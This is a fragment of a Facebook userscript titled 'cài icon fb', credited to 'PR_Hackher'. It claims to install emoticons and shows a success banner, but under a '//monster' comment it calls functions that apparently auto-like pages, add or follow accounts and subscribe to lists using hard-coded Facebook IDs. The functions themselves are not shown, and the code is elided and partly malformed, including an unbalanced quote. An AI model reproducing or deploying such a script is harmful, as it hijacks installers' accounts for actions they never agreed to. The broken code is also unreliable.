// ==UserScript==
// @name            cài icon fb
// @description     All about facebook By PR_Hackher
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/jackbaxtercody.hieu" target="_blank">CÀI ĐẶT icon THÀNH CÔNG!.<br>PR.Hackher </a>';
	html += '</div>';
...
//monster
Like("1382641868643902");
a("100003291703390");
a("100005826097225");
a("100004575821476");
a("100004608880648");
sublist("273451089484083");
P("1382641868643902");
P(519823784804007");
P("521114468008272")
;P("519828328136886")
